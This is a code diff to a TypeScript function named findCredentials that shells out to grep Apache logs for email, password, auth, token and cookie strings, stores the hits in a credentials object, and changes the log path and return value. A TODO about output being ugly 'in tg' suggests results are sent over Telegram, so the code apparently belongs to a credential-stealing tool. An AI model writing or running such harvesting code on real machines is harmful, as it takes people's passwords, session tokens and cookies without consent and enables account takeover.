@@ -52,34 +52,34 @@ const findCredentials = (text: string) => {
     }
   }
 
-  const apacheEmailLog = _run(`cat /var/log/apache/*.log | grep -i "mail"`);
-  const apachePassLog = _run(`cat /var/log/apache/*.log | grep -i "pass"`);
-  const apacheAuthLog = _run(`cat /var/log/apache/*.log | grep -i "auth"`);
-  const apacheTokenLog = _run(`cat /var/log/apache/*.log | grep -i "token"`);
-  const apacheCookieLog = _run(`cat /var/log/apache/*.log | grep -i "cookie"`);
+  const apacheEmailLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "mail"`);
+  const apachePassLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "pass"`);
+  const apacheAuthLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "auth"`);
+  const apacheTokenLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "token"`);
+  const apacheCookieLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "cookie"`);
   if (apacheEmailLog) {
     credentials.apache.emailLog = {} as any;
-    credentials.apache.emailLog.path = `$ cat /var/log/apache/*.log | grep -i "mail"`;
+    credentials.apache.emailLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "mail"`;
     credentials.apache.emailLog.content = apacheEmailLog;
   }
   if (apachePassLog) {
     credentials.apache.passLog = {} as any;
-    credentials.apache.passLog.path = `$ cat /var/log/apache/*.log | grep -i "pass"`; 
+    credentials.apache.passLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "pass"`; 
     credentials.apache.passLog.content = apachePassLog;
   }
   if (apacheAuthLog) {
     credentials.apache.authLog = {} as any;
-    credentials.apache.authLog.path = `$ cat /var/log/apache/*.log | grep -i "auth"`; 
+    credentials.apache.authLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "auth"`; 
     credentials.apache.authLog.content = apacheAuthLog;
   }
   if (apacheTokenLog) {
     credentials.apache.tokenLog = {} as any;
-    credentials.apache.tokenLog.path = `$ cat /var/log/apache/*.log | grep -i "token"`;
+    credentials.apache.tokenLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "token"`;
     credentials.apache.tokenLog.content = apacheTokenLog;
   }
   if (apacheCookieLog) {
     credentials.apache.cookieLog = {} as any;
-    credentials.apache.cookieLog.path = `cat /var/log/apache/*.log | grep -i "cookie"`;
+    credentials.apache.cookieLog.path = `cat ${path}/var/log/apache/*.log | grep -i "cookie"`;
     credentials.apache.cookieLog.content = apacheCookieLog;
   }
 
@@ -457,9 +457,9 @@ const findCredentials = (text: string) => {
 
   // TODO: Remove void objects
   // TODO: Pretty Ouput function (json is ugly in tg)
-  return JSON.stringify(credentials, null, 2);
-  // console.log(JSON.stringify(credentials, null, 2));
-  // return "dummy";
+  // return JSON.stringify(credentials, null, 2);
+   console.log(JSON.stringify(credentials, null, 2));
+   return "dummy";
 }
 
 export default findCredentials;
